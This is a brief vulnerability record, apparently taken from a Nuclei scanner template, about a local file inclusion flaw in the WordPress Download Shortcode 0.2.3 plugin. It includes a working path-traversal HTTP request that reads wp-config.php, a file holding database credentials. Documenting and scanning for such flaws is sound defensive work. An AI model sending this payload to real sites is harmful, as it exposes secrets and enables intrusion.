# Vulnerability: WordPress Download Shortcode 0.2.3 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`shortcode-lfi.yaml`)

## Description
WordPress Download Shortcode 0.2.3 is prone to a local file inclusion vulnerability because it fails to sufficiently sanitize user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. Prior versions may also be affected.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/force-download.php?file=../wp-config.php
```

